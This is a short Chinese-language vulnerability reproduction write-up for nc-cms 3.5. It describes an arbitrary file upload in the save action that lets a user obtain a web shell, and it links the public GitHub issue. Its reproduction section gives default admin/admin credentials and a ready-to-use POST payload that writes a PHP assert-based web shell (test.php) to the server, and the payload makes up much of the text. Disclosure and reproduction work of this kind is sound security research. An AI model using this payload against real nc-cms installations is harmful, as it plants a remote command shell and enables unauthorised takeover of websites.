## 1. 漏洞介绍

nc-cms 3.5中的lib / NCCms.class.php允许通过index.php？action = save name和editordata参数上传.php文件。

源码：

[There is an vulnerability in the filesystem that can get a webshell · Issue #14 · gnat/nc-cms · GitHub](https://github.com/gnat/nc-cms/issues/14)

## 2. 漏洞复现

登录：admin/admin

payload：

```php
http://…………/nc-cms/index.php?action=save&ref
POST
name=test.php&editordata=<?php assert($_GET['cmd']);?>
```

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312282010269.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312282010887.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312282010831.png)
